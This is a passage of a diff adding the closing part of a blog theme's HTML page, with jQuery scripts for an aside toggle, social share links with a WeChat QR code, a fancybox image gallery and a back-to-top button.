+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
